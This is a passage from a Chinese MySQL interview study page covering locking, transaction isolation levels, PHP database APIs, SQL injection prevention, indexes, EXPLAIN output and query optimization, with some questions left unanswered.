&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;集合类型&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;数据库的数据存储容量相应缩小，利于减少数据操纵的逻辑IO和物理IO；&lt;/li&gt;
  &lt;li&gt;集合类型的数据读取方便，可根据字符串值，也可以根据字符串集合的顺序编号；&lt;/li&gt;
  &lt;li&gt;集合类型字段的定义属性维护与其他数据类型类似，并不特殊化；&lt;/li&gt;
  &lt;li&gt;开发工程师，不需要借助额外的集合元素编码表或程序中使用编号替代集合的字符串元素，达到减少开发成本、提高代码的可读性和可维护性；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;缺点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;集合类型字段的集合元素限制最大为64个；&lt;/li&gt;
  &lt;li&gt;集合类型字段的定义属性的集合元素，删除导致锁表而影响数据服务提供；&lt;/li&gt;
  &lt;li&gt;集合类型字段的定义属性的集合元素增加，只能以尾部追加的方式，若是此特性没有掌握，则会导致数据服务提供受影响；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;人才招聘网站的用户，设置工作意向城市一项，则往往会选择1-3个城市，甚至更多城市，采用集合类型字段作为数据存储结果的话，将可以大量简化程序复杂度，以及大规模降低数据存储的容量，唯一的遗憾则是集合元素限制为64个，会导致无法满足招聘网站后期业务发展需要。&lt;/p&gt;

&lt;h2 id=&quot;表锁和行锁的优缺点&quot;&gt;表锁和行锁的优缺点？&lt;/h2&gt;

&lt;p&gt;MySQL有三种锁的级别：页级、表级、行级。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MyISAM和MEMORY存储引擎采用的是表级锁（table-level locking）；&lt;/li&gt;
  &lt;li&gt;BDB存储引擎采用的是页面锁（page-level locking），但也支持表级锁；&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;InnoDB存储引擎既支持行级锁（row-level locking），也支持表级锁，但默认情况下是采用行级锁。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。&lt;/li&gt;
  &lt;li&gt;行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。&lt;/li&gt;
  &lt;li&gt;页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;MySQL的表级锁有两种模式：表共享读锁（Table Read Lock）和表独占写锁（Table Write
Lock）。MyISAM在执行查询语句（SELECT）前，会自动给涉及的所有表加读锁，在执行更新操作（UPDATE、DELETE、INSERT等）前，会自动给涉及的表加写锁。
所以对MyISAM表进行操作，会有以下情况：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;对MyISAM表的读操作（加读锁），不会阻塞其他进程对同一表的读请求，但会阻塞对同一表的写请求。只有当读锁释放后，才会执行其它进程的写操作。&lt;/li&gt;
  &lt;li&gt;对MyISAM表的写操作（加写锁），会阻塞其他进程对同一表的读和写操作，只有当写锁释放后，才会执行其它进程的读写操作。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;原则上数据表有一个读锁时，其它进程无法对此表进行更新操作，但在一定条件下，MyISAM表也支持读取和插入操作的并发进行。MyISAM存储引擎有一个系统变量concurrent_insert，专门用以控制其并发插入的行为，其值分别可以为0、1或2&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;当concurrent_insert设置为0时，不允许并发插入。&lt;/li&gt;
  &lt;li&gt;当concurrent_insert设置为1时，如果MyISAM表中没有空洞（即表的中间没有被删除的行），MyISAM允许在一个进程读表的同时，另一个进程从表尾插入记录。这也是MySQL的默认设置。&lt;/li&gt;
  &lt;li&gt;当concurrent_insert设置为2时，无论MyISAM表中有没有空洞，都允许在表尾并发插入记录。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由于MySQL认为写请求一般比读请求要重要，所以如果有读写请求同时进行的话，MYSQL将会优先执行写操作。这样MyISAM表在进行大量的更新操作时（特别是更新的字段中存在索引的情况下），会造成查询操作很难获得读锁，从而导致查询阻塞。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;通过指定启动参数low-priority-updates，使MyISAM引擎默认给予读请求以优先的权利。&lt;/li&gt;
  &lt;li&gt;通过执行命令SET LOW_PRIORITY_UPDATES=1，使该连接发出的更新请求优先级降低。&lt;/li&gt;
  &lt;li&gt;通过指定INSERT、UPDATE、DELETE语句的LOW_PRIORITY属性，降低该语句的优先级。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;当数据库的表有锁的时候此时有插入数据的操作是直接插入还是等待解锁后插入&quot;&gt;当数据库的表有锁的时候，此时有插入数据的操作，是直接插入还是等待解锁后插入？&lt;/h2&gt;

&lt;h2 id=&quot;事务一般应用在哪些场景下&quot;&gt;事务一般应用在哪些场景下？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;原子性，是一个不可分割的逻辑单元，一组sql语句，要么都执行，要么都不执行。&lt;/li&gt;
  &lt;li&gt;隔离性，事务中的执行过程是不可见的。&lt;/li&gt;
  &lt;li&gt;持久性，事务一旦提交，就不可撤销。&lt;/li&gt;
  &lt;li&gt;一致性，事务在发生之前和发生之后，数据是一致。(能量守恒)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;php如何调用mysql的事务&quot;&gt;PHP如何调用MySQL的事务？&lt;/h2&gt;

&lt;h2 id=&quot;如果事务出现脏读或者幻读如何解决&quot;&gt;如果事务出现脏读或者幻读，如何解决？&lt;/h2&gt;

&lt;p&gt;MySQL InnoDB事务的隔离级别有四级，默认是“可重复读”（REPEATABLE READ）。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;未提交读（READUNCOMMITTED）。另一个事务修改了数据，但尚未提交，而本事务中的SELECT会读到这些未被提交的数据（脏读）。&lt;/li&gt;
  &lt;li&gt;提交读（READCOMMITTED）。本事务读取到的是最新的数据（其他事务提交后的）。问题是，在同一个事务里，前后两次相同的SELECT会读到不同的结果（不重复读）。&lt;/li&gt;
  &lt;li&gt;可重复读（REPEATABLEREAD）。在同一个事务里，SELECT的结果是事务开始时时间点的状态，因此，同样的SELECT操作读到的结果会是一致的。但是，会有幻读现象（稍后解释）。&lt;/li&gt;
  &lt;li&gt;串行化（SERIALIZABLE）。读操作会隐式获取共享锁，可以保证不同事务间的互斥。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;四个级别逐渐增强，每个级别解决一个问题。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;脏读 最容易理解。另一个事务修改了数据，但尚未提交，而本事务中的SELECT会读到这些未被提交的数据。&lt;/li&gt;
  &lt;li&gt;不重复读。解决了脏读后，会遇到，同一个事务执行过程中，另外一个事务提交了新数据，因此本事务先后两次读到的数据结果会不一致。&lt;/li&gt;
  &lt;li&gt;幻读 解决了不重复读，保证了同一个事务里，查询的结果都是事务开始时的状态（一致性）。但是，如果另一个事务同时提交了新数据，本事务再更新时，就会“惊奇的”发现了这些新数据，貌似之前读到的数据是“鬼影”一样的幻觉。&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mysql驱动与api&quot;&gt;MySQL驱动与API&lt;/h1&gt;

&lt;h2 id=&quot;mysql的驱动是php_mysqlso或php_mysqldll吗&quot;&gt;MySQL的驱动是php_mysql.so或php_mysql.dll吗？&lt;/h2&gt;

&lt;h2 id=&quot;如何选择一个驱动后来又想换一个驱动怎么办&quot;&gt;如何选择一个驱动，后来又想换一个驱动怎么办？&lt;/h2&gt;

&lt;p&gt;可以通过ORM 工具做到，Propel 和 Doctrine。或者数据库框架，&lt;a href=&quot;https://github.com/catfan/Medoo&quot;&gt;Medoo&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;php的mysql-api有几种他们各有什么优缺点&quot;&gt;PHP的MySQL API有几种？他们各有什么优缺点？&lt;/h2&gt;

&lt;p&gt;The PHP MySQL extensions are lightweight wrappers on top of a C client library. There are 3 PHP MySQL extensions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ext/mysql (not recommended)&lt;/li&gt;
  &lt;li&gt;ext/mysqli&lt;/li&gt;
  &lt;li&gt;PDO_MySQL&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;~&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;PDO&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;MySQLi&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Database support&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;12 different drivers&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MySQL only&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;API&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OOP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OOP + procedural&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Connection&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Easy&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Easy&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Named parameters&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Object mapping&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Yes&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Prepared statements (client side)&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;No&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Performance&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fast&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Fast&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Stored procedures&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Yes&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;普通的mysql连接肯定是会被抛弃的 因为每次都要防止sql注入的问题 而且相对来说比较慢&lt;br /&gt;
mysqli是在普通mysql的基础上做的一次优化 说实话 很成功 预处理方式完全解决了sql注入的问题，但是唯一的不足点 就是只支持mysql数据库 当然 如果你要是不操作其他的数据库或者 当然这无疑是最好的选择 &lt;br /&gt;
PDO则是最新出来的一种 连接方式 兼容大部分数据库 也解决了sql注入 但是也有缺点 它只支持php5以上的版本 不过听说在未来的php6中 只支持这种连接&lt;/p&gt;

&lt;h2 id=&quot;如果有多条sql语句要一起执行怎么办&quot;&gt;如果有多条SQL语句要一起执行，怎么办？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;在MySQL的连接字符串中设置allowMultiQueries参数置为true&lt;/li&gt;
  &lt;li&gt;PDO在默认情况下参数绑定在php客户端进行，是不允许多语句的，需要&lt;code&gt;$db-&amp;gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, 0);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何防止sql语句注入&quot;&gt;如何防止SQL语句注入？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;prepareStatement + Bind-variable&lt;/li&gt;
  &lt;li&gt;使用应用程序提供的转换函数 &lt;code&gt;mysql_real_escape_string&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mysql索引&quot;&gt;MySQL索引&lt;/h1&gt;

&lt;h2 id=&quot;索引有哪些&quot;&gt;索引有哪些？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;B-Tree索引 (普通索引， 唯一索引， 主键索引)&lt;/li&gt;
  &lt;li&gt;Hash索引&lt;/li&gt;
  &lt;li&gt;全文索引&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何选择索引&quot;&gt;如何选择索引？&lt;/h2&gt;

&lt;h2 id=&quot;怎么创建全文索引&quot;&gt;怎么创建全文索引？&lt;/h2&gt;

&lt;h2 id=&quot;innodb引擎上可以创建全文索引吗&quot;&gt;InnoDB引擎上可以创建全文索引吗？&lt;/h2&gt;

&lt;p&gt;MySQL 5.6.4里才添加了InnoDB引擎的Full-Text索引支持。&lt;br /&gt;
推荐用Lucene（ElasticSearch比较容易部署）或Sphinx这样的第三方解决方案。&lt;/p&gt;

&lt;h2 id=&quot;什么是最左前缀原则应用在什么索引上&quot;&gt;什么是最左前缀原则？应用在什么索引上？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;最左前缀匹配原则，非常重要的原则，mysql会一直向右匹配直到遇到范围查询(&amp;gt;、&amp;lt;、between、like)就停止匹配，比如a = 1 and b = 2 and c &amp;gt; 3 and d = 4 如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;索引是怎么实现的&quot;&gt;索引是怎么实现的？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;索引（Index）是帮助MySQL高效获取数据的数据结构。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;目前大部分数据库系统及文件系统都采用B-Tree或其变种B+Tree作为索引结构&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;sql语句优化&quot;&gt;SQL语句优化&lt;/h1&gt;

&lt;h2 id=&quot;sql语句执行的逻辑顺序是怎样的&quot;&gt;SQL语句执行的逻辑顺序是怎样的？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;语法分析，分析语句的语法是否符合规范，衡量语句中各表达式的意义。&lt;/li&gt;
  &lt;li&gt;语义分析，检查语句中涉及的所有数据库对象是否存在，且用户有相应的权限。&lt;/li&gt;
  &lt;li&gt;视图转换，将涉及视图的查询语句转换为相应的对基表查询语句。&lt;/li&gt;
  &lt;li&gt;表达式转换， 将复杂的 SQL 表达式转换为较简单的等效连接表达式。&lt;/li&gt;
  &lt;li&gt;选择优化器，不同的优化器一般产生不同的“执行计划”&lt;/li&gt;
  &lt;li&gt;选择连接方式， ORACLE 有三种连接方式，对多表连接 ORACLE 可选择适当的连接方式。&lt;/li&gt;
  &lt;li&gt;选择连接顺序， 对多表连接 ORACLE 选择哪一对表先连接，选择这两表中哪个表做为源数据表。&lt;/li&gt;
  &lt;li&gt;选择数据的搜索路径，根据以上条件选择合适的数据搜索路径，如是选用全表搜索还是利用索引或是其他的方式。&lt;/li&gt;
  &lt;li&gt;运行“执行计划”。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何判断sql语句执行的效率&quot;&gt;如何判断SQL语句执行的效率&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;explain&lt;/code&gt;输出解释&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;+----+-------------+-------+-------+-------------------+---------+---------+-------+------+-------+
| id | select_type | table | type  | possible_keys     | key     | key_len | ref   | rows | Extra |
+----+-------------+-------+-------+-------------------+---------+---------+-------+------+-------+
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Column&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Meaning&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;id&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The SELECT identifier&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;select_type&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The SELECT type&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;table&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The table for the output row&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;type&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The join type&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;possible_keys&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The possible indexes to choose&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;key&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The index actually chosen&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;key_len&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The length of the chosen key&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ref&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;The columns compared to the index&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;rows&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Estimate of rows to be examined&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Extra&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Additional information&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ol&gt;
  &lt;li&gt;id select标识,SQL从大到小的执行.&lt;/li&gt;
  &lt;li&gt;select_type 就是select类型,可以有以下几种
    &lt;ul&gt;
      &lt;li&gt;SIMPLE 简单SELECT(不使用UNION或子查询)&lt;/li&gt;
      &lt;li&gt;PRIMARY 最外面的&lt;/li&gt;
      &lt;li&gt;UNION UNION中的第二个或后面的SELECT语句&lt;/li&gt;
      &lt;li&gt;DEPENDENT UNION UNION中的第二个或后面的SELECT语句，取决于外面的查询&lt;/li&gt;
      &lt;li&gt;UNION RESULT UNION的结果&lt;/li&gt;
      &lt;li&gt;SUBQUERY 子查询中的第一个&lt;/li&gt;
      &lt;li&gt;DEPENDENT SUBQUERY 子查询中的第一个SELECT，取决于外面的查询&lt;/li&gt;
      &lt;li&gt;DERIVED 导出表的SELECT(FROM子句的子查询)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;talbe 表明这一行涉及了哪张表，也可能是一下的值：
    &lt;ul&gt;
      &lt;li&gt;&amp;lt;unionM,N&amp;gt;: The row refers to the union of the rows with id values of M and N.&lt;/li&gt;
      &lt;li&gt;&amp;lt;derivedN&amp;gt;: The row refers to the derived table result for the row with an id value of N. A derived table may result, for example, from a subquery in the FROM clause.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;type 联接类型。下面给出各种联接类型，按照从最佳类型到最坏类型进行排序：
    &lt;ul&gt;
      &lt;li&gt;system 表仅有一行(=系统表)。这是const联接类型的一个特例。&lt;/li&gt;
      &lt;li&gt;const 表最多有一个匹配行，它将在查询开始时被读取。因为仅有一行，在这行的列值可被优化器剩余部分认为是常数。const表很快，因为它们只读取一次！
const用于用常数值比较PRIMARY KEY或UNIQUE索引的所有部分时。&lt;/li&gt;
      &lt;li&gt;eq_ref 对于每个来自于前面的表的行组合，从该表中读取一行。这可能是最好的联接类型，除了const类型。它用在一个索引的所有部分被联接使用并且索引是UNIQUE或PRIMARY KEY。
eq_ref可以用于使用= 操作符比较的带索引的列。比较值可以为常量或一个使用在该表前面所读取的表的列的表达式。&lt;/li&gt;
      &lt;li&gt;ref 对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这张表中读取。如果联接只使用键的最左边的前缀，或如果键不是UNIQUE或PRIMARY KEY（换句话说，如果联接不能基于关键字选择单个行的话），则使用ref。如果使用的键仅仅匹配少量行，该联接类型是不错的。ref可以用于使用=或&amp;lt;=&amp;gt;操作符的带索引的列。&lt;/li&gt;
      &lt;li&gt;ref_or_null 该联接类型如同ref，但是添加了MySQL可以专门搜索包含NULL值的行。在解决子查询中经常使用该联接类型的优化。&lt;/li&gt;
      &lt;li&gt;index_merge 该联接类型表示使用了索引合并优化方法。在这种情况下，key列包含了使用的索引的清单，key_len包含了使用的索引的最长的关键元素。&lt;/li&gt;
      &lt;li&gt;unique_subquery 该类型替换了下面形式的IN子查询的ref： value IN (SELECT primary_key FROM single_table WHERE some_expr) unique_subquery是一个索引查找函数，可以完全替换子查询，效率更高。&lt;/li&gt;
      &lt;li&gt;index_subquery 该联接类型类似于unique_subquery。可以替换IN子查询，但只适合下列形式的子查询中的非唯一索引：value IN (SELECT key_column FROM single_table WHERE some_expr)&lt;/li&gt;
      &lt;li&gt;range 只检索给定范围的行，使用一个索引来选择行。key列显示使用了哪个索引。key_len包含所使用索引的最长关键元素。在该类型中ref列为NULL。当使用=、&amp;lt;&amp;gt;、&amp;gt;、&amp;gt;=、&amp;lt;、&amp;lt;=、IS NULL、&amp;lt;=&amp;gt;、BETWEEN或者IN操作符，用常量比较关键字列时，可以使用range：SELECT * FROM tbl_name WHERE key_column = 10;SELECT * FROM tbl_name WHERE key_column BETWEEN 10 and 20; SELECT * FROM tbl_name WHERE key_column IN (10,20,30); SELECT * FROM tbl_name WHERE key_part1= 10 AND key_part2 IN (10,20,30);&lt;/li&gt;
      &lt;li&gt;index 该联接类型与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小。当查询只使用作为单索引一部分的列时，MySQL可以使用该联接类型。&lt;/li&gt;
      &lt;li&gt;ALL 对于每个来自于先前的表的行组合，进行完整的表扫描。如果表是第一个没标记const的表，这通常不好，并且通常在它情况下很差。通常可以增加更多的索引而不要使用ALL，使得行能基于前面的表中的常数值或列值被检索出。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;possible_keys列指出MySQL能使用哪个索引在该表中找到行。注意，该列完全独立于EXPLAIN输出所示的表的次序。这意味着在possible_keys中的某些键实际上不能按生成的表次序使用。&lt;/li&gt;
  &lt;li&gt;key列显示MySQL实际决定使用的键（索引）。如果没有选择索引，键是NULL。要想强制MySQL使用或忽视possible_keys列中的索引，在查询中使用FORCE INDEX、USE INDEX或者IGNORE INDEX。对于MyISAM和BDB表，运行ANALYZE TABLE可以帮助优化器选择更好的索引。对于MyISAM表，可以使用myisamchk –analyze。&lt;/li&gt;
  &lt;li&gt;key_len列显示MySQL决定使用的键长度。如果键是NULL，则长度为NULL。注意通过key_len值我们可以确定MySQL将实际使用一个多部关键字的几个部分。&lt;/li&gt;
  &lt;li&gt;ref列显示使用哪个列或常数与key一起从表中选择行。&lt;/li&gt;
  &lt;li&gt;rows列显示MySQL认为它执行查询时必须检查的行数。&lt;/li&gt;
  &lt;li&gt;Extra 列包含MySQL解决查询的详细信息。下面解释了该列可以显示的不同的文本字符串：
    &lt;ul&gt;
      &lt;li&gt;Distinct MySQL发现第1个匹配行后，停止为当前的行组合搜索更多的行。&lt;/li&gt;
      &lt;li&gt;Not exists MySQL能够对查询进行LEFT JOIN优化，发现1个匹配LEFT JOIN标准的行后，不再为前面的的行组合在该表内检查更多的行。&lt;/li&gt;
      &lt;li&gt;range checked for each record (index map: #) MySQL没有发现好的可以使用的索引，但发现如果来自前面的表的列值已知，可能部分索引可以使用。对前面的表的每个行组合，MySQL检查是否可以使用range或index_merge访问方法来索取行&lt;/li&gt;
      &lt;li&gt;Using filesort MySQL需要额外的一次传递，以找出如何按排序顺序检索行。通过根据联接类型浏览所有行并为所有匹配WHERE子句的行保存排序关键字和行的指针来完成排序。然后关键字被排序，并按排序顺序检索行。&lt;/li&gt;
      &lt;li&gt;Using index 从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。当查询只使用作为单一索引一部分的列时，可以使用该策略。&lt;/li&gt;
      &lt;li&gt;Using temporary 为了解决查询，MySQL需要创建一个临时表来容纳结果。典型情况如查询包含可以按不同情况列出列的GROUP BY和ORDER BY子句时。&lt;/li&gt;
      &lt;li&gt;Using where WHERE子句用于限制哪一个行匹配下一个表或发送到客户。除非你专门从表中索取或检查所有行，如果Extra值不为Using where并且表联接类型为ALL或index，查询可能会有一些错误。&lt;/li&gt;
      &lt;li&gt;Using sort_union(…), Using union(…), Using intersect(…)这些函数说明如何为index_merge联接类型合并索引扫描。&lt;/li&gt;
      &lt;li&gt;Using index for group-by 类似于访问表的Using index方式，Using index for group-by表示MySQL发现了一个索引，可以用来查询GROUP BY或DISTINCT查询的所有列，而不要额外搜索硬盘访问实际的表。并且，按最有效的方式使用索引，以便对于每个组，只读取少量索引条目。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;sql语句优化的原则是什么&quot;&gt;SQL语句优化的原则是什么？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;减少 IO 次数
IO永远是数据库最容易瓶颈的地方，这是由数据库的职责所决定的，大部分数据库操作中超过90%的时间都是 IO 操作所占用的，减少 IO 次数是 SQL 优化中需要第一优先考虑，当然，也是收效最明显的优化手段。&lt;/li&gt;
  &lt;li&gt;降低 CPU 计算
除了 IO 瓶颈之外，SQL优化中需要考虑的就是 CPU 运算量的优化了。order by, group by,distinct … 都是消耗 CPU 的大户（这些操作基本上都是 CPU 处理内存中的数据比较运算）。当我们的 IO 优化做到一定阶段之后，降低 CPU 计算也就成为了我们 SQL 优化的重要目标&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;select--的方式到底好不好为什么&quot;&gt;select * 的方式到底好不好？为什么?&lt;/h2&gt;

&lt;p&gt;从数据库里读出越多的数据，那么查询就会变得越慢。并且，如果你的数据库服务器和WEB服务器是两台独立的服务器的话，这还会增加网络传输的负载。&lt;/p&gt;

&lt;h2 id=&quot;当一条sql语句要选择出所有的男性成员的时候怎么才能快速的差出来&quot;&gt;当一条SQL语句要选择出所有的男性成员的时候怎么才能快速的差出来？&lt;/h2&gt;

&lt;p&gt;性别字段加索引&lt;/p&gt;

&lt;h2 id=&quot;limit-1000010这样的语句查询起来可能会很慢该怎么优化才能快速的差出来呢&quot;&gt;limit 10000,10这样的语句查询起来可能会很慢，该怎么优化才能快速的差出来呢？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;对于数据量较大数据表，可以建立主键和索引字段建立索引表，通过索引表查询相应的主键，在通过主键查询数据量的数据表；&lt;/li&gt;
  &lt;li&gt;如果对于有where 条件，又想走索引用limit的，必须设计一个索引，将where 放第一位，limit用到的主键放第2位，而且只能select 主键！这样能提高读取速度&lt;/li&gt;
  &lt;li&gt;利用in：先通过where条件取得相应的主键值，然后利用主键值查询相应的字段值。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;估计查询性能&quot;&gt;估计查询性能&lt;/h2&gt;

&lt;p&gt;在大多数情况下，可以通过计算磁盘搜索来估计性能。对小的表，通常能在1次磁盘搜索中找到行(因为索引可能被缓存)。对更大的表，可以使用B－树索引进行估计，将需要log(row_count)/log(index_block_length/3 * 2/(index_length + data_pointer_length))+1次搜索才能找到行。
在MySQL中，索引块通常是1024个字节，数据指针通常是4个字节，这对于有一个长度为3(中等整数)的索引的500,000行的表，通过公式可以计算出log(500,000)/log(1024/3*2/(3+4))+1= 4次搜索。
上面的索引需要大约500,000 * 7 * 3/2 = 5.2MB，(假设典型情况下索引缓存区填充率为2/3)，可以将大部分索引保存在内存中，仅需要1-2调用从OS读数据来找出行。
然而对于写，将需要4次搜索请求(如上)来找到在哪儿存放新索引，并且通常需要2次搜索来更新这个索引并且写入行。
注意，上述讨论并不意味着应用程序的性能将缓慢地以logN 退化！当表格变得更大时，所有内容缓存到OS或SQL服务器后，将仅仅或多或少地更慢。在数据变得太大不能缓存后，将逐渐变得更慢，直到应用程序只能进行磁盘搜索(以logN增加)。为了避免这个问题，随数据增加而增加 键高速缓冲区大小。对于MyISAM表, 由key_buffer_size系统变量控制 键高速缓冲区大小&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mysql分表&quot;&gt;MySQL分表&lt;/h1&gt;

&lt;h2 id=&quot;垂直拆分和水平拆分分别应用到什么场景下&quot;&gt;垂直拆分和水平拆分分别应用到什么场景下？&lt;/h2&gt;

&lt;blockquote&gt;
